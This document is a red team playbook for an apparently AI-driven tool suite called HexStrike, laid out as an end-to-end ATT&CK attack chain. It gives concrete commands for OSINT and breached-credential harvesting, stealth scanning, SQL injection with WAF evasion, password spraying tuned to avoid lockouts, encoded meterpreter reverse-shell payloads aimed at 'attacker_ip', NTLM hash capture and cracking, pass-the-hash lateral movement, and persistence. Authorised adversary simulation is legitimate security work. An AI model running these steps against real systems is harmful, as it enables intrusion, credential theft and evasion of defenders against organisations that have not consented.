# HexStrike Red Team Operations Playbook

Adversary simulation methodology emphasizing stealth, OPSEC, and realistic
attack paths. Maps MITRE ATT&CK tactics to HexStrike tool chains.

---

## OPSEC Rules

Before every action, consider:
- **Detection risk**: Will this trigger alerts? Use passive tools first.
- **Rate limiting**: Slow scans avoid IDS/WAF triggers.
- **Logging**: Assume every request is logged.
- **Attribution**: Use objective="stealth" where available.

---

## Phase 1: External Reconnaissance (TA0043)

### Passive — Zero Contact With Target

```
# OSINT intelligence gathering
shodan_host_lookup(target="target.com")
→ Ports, services, banners WITHOUT touching the target

censys_host_lookup(target="target.com")
→ Certificates, services, TLS configuration

censys_certificate_search(query="target.com")
→ Find all certificates issued to the org (reveals infrastructure)

# Subdomain enumeration (passive sources only)
subfinder_scan(target="target.com")
amass_enum(target="target.com", mode="passive")

# Historical data mining
waybackurls_fetch(target="target.com")
gau_fetch(target="target.com")

# Email/personnel harvesting
theharvester_scan(target="target.com", source="all")
→ Emails, names, subdomains from public sources

# Breach intelligence
hibp_domain_search(domain="target.com")
→ Employees with breached credentials = initial access vector

# GitHub/source code secrets
trufflehog_scan(target="https://github.com/target-org")
→ API keys, tokens, passwords in public repos
```

**Passive recon decision tree:**
```
IF shodan reveals exposed admin panels:
  → Priority target for credential attacks
IF hibp reveals breached employee emails:
  → Credential stuffing / password spraying vector
IF trufflehog finds valid API keys:
  → Direct access without exploitation
IF certificate search reveals internal hostnames:
  → Internal infrastructure mapping
```

### Active — Controlled Direct Contact

```
# Stealth port scan (SYN scan, rate limited)
nmap_scan(target="target.com",
          scan_type="-sS -sV",
          additional_args="--max-rate 100 --randomize-hosts -T2")

# Technology fingerprinting
detect_technologies_ai(target="target.com")

# WAF detection (know what you're up against)
wafw00f_scan(target="https://target.com")
```

---

## Phase 2: Resource Development (TA0042)

### Attack Planning
```
# AI-powered attack path generation
create_attack_chain_ai(target="target.com",
                       findings=<recon_findings>,
                       objective="stealth")
→ Returns ordered steps with success probability

# Tool selection based on stealth requirements
select_optimal_tools_ai(target="target.com",
                        objective="stealth",
                        constraints={"no_active_scan": True})
```

### Credential Preparation
```
# If breached credentials found from HIBP:
# Prepare credential lists for password spraying
# Common patterns: Season+Year (Winter2024!), Company+Number (Target123!)

# Hash cracking for any hashes obtained
john_crack(hash_file="hashes.txt", wordlist="rockyou.txt", rules="best64")
hashcat_crack(hash_file="hashes.txt", mode=1000,
              wordlist="rockyou.txt", rules="dive")
```

---

## Phase 3: Initial Access (TA0001)

### Web Application Exploitation

Read `hexstrike://ttp/web-injection` and `hexstrike://ttp/waf-evasion` first.

```
# SQLi with WAF evasion
sqlmap_scan(target="https://target.com/login",
            level=3, risk=2,
            tamper=<based_on_wafw00f_result>,
            delay=2, random_agent=True)

# SSTI for RCE
tplmap_scan(target="https://target.com/profile?name=test")

# Command injection
commix_scan(target="https://target.com/api/diagnostic")
```

### Credential-Based Access

```
# Password spraying (slow and low to avoid lockouts)
hydra_brute_force(target="target.com",
                  service="https-form-post",
                  username_list="harvested_emails.txt",
                  password_list="seasonal_passwords.txt",
                  additional_args="-W 30 -t 1")
# -W 30 = 30 second wait between attempts
# -t 1  = single thread (avoid lockout)

# OWA/Exchange spray
hydra_brute_force(target="mail.target.com",
                  service="https-form-post",
                  additional_args="-W 60")

# SSH/RDP if exposed
hydra_brute_force(target="target.com",
                  service="ssh",
                  username_list="users.txt",
                  password_list="top100.txt",
                  additional_args="-t 2 -W 10")
```

### Phishing Payloads (If In Scope)
```
# Generate payloads for social engineering
ai_payload_generate(payload_type="reverse_shell",
                    target_os="windows",
                    encoding="base64")

msfvenom_generate(payload="windows/meterpreter/reverse_https",
                  format="exe",
                  lhost="attacker_ip",
                  lport=443,
                  encoder="x86/shikata_ga_nai",
                  iterations=5)
```

---

## Phase 4: Internal Reconnaissance (TA0007)

### After Initial Foothold

```
# If on a Windows domain host:
# Enumerate AD from compromised host

# Network discovery from inside
nmap_scan(target="10.0.0.0/24",
          scan_type="-sn",
          additional_args="--max-rate 50")
→ Ping sweep to find live hosts

# Service enumeration on discovered hosts
nmap_scan(target="10.0.0.0/24",
          scan_type="-sV",
          ports="21,22,23,25,53,80,88,135,139,389,443,445,636,1433,3306,3389,5432,5985,8080,8443",
          additional_args="-T2")
```

### SMB/AD Enumeration (read `hexstrike://ttp/network-exploit`)
```
enum4linux_ng_advanced(target="10.0.0.1")
→ Users, groups, shares, policies, password policy

smbmap_scan(target="10.0.0.1", username="user", password="pass")
→ Share permissions mapping

rpcclient_enumeration(target="10.0.0.1", username="user", password="pass")
→ Domain user enumeration, SID lookups
```

### Credential Harvesting
```
# Responder for NTLM hash capture (if on same network segment)
responder_credential_harvest(interface="eth0", options="-wrfv")
→ Captures NTLM hashes from LLMNR/NBT-NS/MDNS

# Crack captured NTLM hashes
hashcat_crack(hash_file="ntlm_hashes.txt",
              mode=5600,
              wordlist="rockyou.txt")
# Mode 5600 = NetNTLMv2
```

---

## Phase 5: Privilege Escalation (TA0004)

### Windows
```
# Check for quick wins from the compromised host:
# - Unquoted service paths
# - Writable service binaries
# - AlwaysInstallElevated
# - Stored credentials
# - Token impersonation

# If WinRM access available:
evil_winrm_connect(target="10.0.0.1",
                   username="user",
                   password="password")
→ Upload privilege escalation tools
```

### Linux
```
# Common privesc vectors:
# - SUID binaries
# - Writable /etc/passwd
# - Sudo misconfigurations
# - Cron jobs with writable scripts
# - Kernel exploits

# Search for exploits
searchsploit_lookup(query="linux kernel 5.4 privilege escalation")
exploitdb_search(query="sudo <version>")
```

---

## Phase 6: Lateral Movement (TA0008)

```
# Pass-the-hash with Evil-WinRM
evil_winrm_connect(target="10.0.0.2",
                   username="admin",
                   hash="<ntlm_hash>")

# SMB lateral movement
netexec_scan(target="10.0.0.0/24",
             username="admin",
             password="password",
             module="smb")

# Check for Kerberoastable accounts
# Extract service ticket hashes, crack offline:
hashcat_crack(hash_file="kerberoast.txt",
              mode=13100,
              wordlist="rockyou.txt")
# Mode 13100 = Kerberos 5 TGS-REP
```

---

## Phase 7: Persistence (TA0003)

**OPSEC reminder**: Only establish persistence if explicitly in scope.

```
# Document all persistence mechanisms for cleanup
# Common methods:
# - Scheduled tasks
# - Registry run keys
# - WMI event subscriptions
# - SSH authorized_keys
# - Web shells (if web access)
# - Service installation
```

---

## Phase 8: Reporting & Cleanup

```
# Comprehensive findings correlation
correlate_session_findings(session_id="<session_id>")

# Generate red team report
generate_report(session_id="<session_id>", format="pdf")
create_executive_summary(session_id="<session_id>")

# Remediation guidance
generate_remediation_plan(session_id="<session_id>")

# Archive engagement
complete_scan_session(session_id="<session_id>")

# Record operational learnings
add_scan_learning(target="target.com",
                  learning="Password spraying via OWA successful with Season+Year pattern")
```

**Cleanup checklist:**
- [ ] Remove all tools uploaded to compromised hosts
- [ ] Delete web shells
- [ ] Remove persistence mechanisms
- [ ] Clear command history on compromised hosts
- [ ] Document all changes made to target environment
- [ ] Provide full list of compromised accounts to client

---

## MITRE ATT&CK Mapping Summary

| Tactic | HexStrike Tools |
|--------|----------------|
| Reconnaissance | `shodan_*`, `censys_*`, `subfinder_scan`, `theharvester_scan`, `hibp_*` |
| Resource Dev | `create_attack_chain_ai`, `msfvenom_generate`, `ai_payload_generate` |
| Initial Access | `sqlmap_scan`, `hydra_brute_force`, `commix_scan` |
| Execution | `evil_winrm_connect`, `http_repeater` |
| Persistence | Document only — manual |
| Priv Escalation | `searchsploit_lookup`, `evil_winrm_connect` |
| Defense Evasion | `wafw00f_scan` + tamper scripts, stealth scan params |
| Credential Access | `responder_credential_harvest`, `hashcat_crack`, `john_crack` |
| Discovery | `nmap_scan`, `enum4linux_*`, `smbmap_scan`, `netexec_scan` |
| Lateral Movement | `evil_winrm_connect`, `netexec_scan` |
| Collection | `correlate_session_findings` |
| Exfiltration | Document findings via `generate_report` |
